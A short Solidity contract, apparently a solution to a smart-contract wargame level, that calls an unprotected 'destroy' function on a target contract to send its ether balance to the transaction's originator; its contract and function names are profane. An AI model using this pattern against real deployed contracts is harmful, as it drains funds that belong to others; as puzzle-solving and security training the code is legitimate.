// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IRecovery {
    function destroy(address payable _to) external;
}

contract FuckRecovery {
    IRecovery recovery;

    constructor(address _address) {
        recovery = IRecovery(_address);
    }

    function fuck() external {
        recovery.destroy(payable(tx.origin));
    }
}
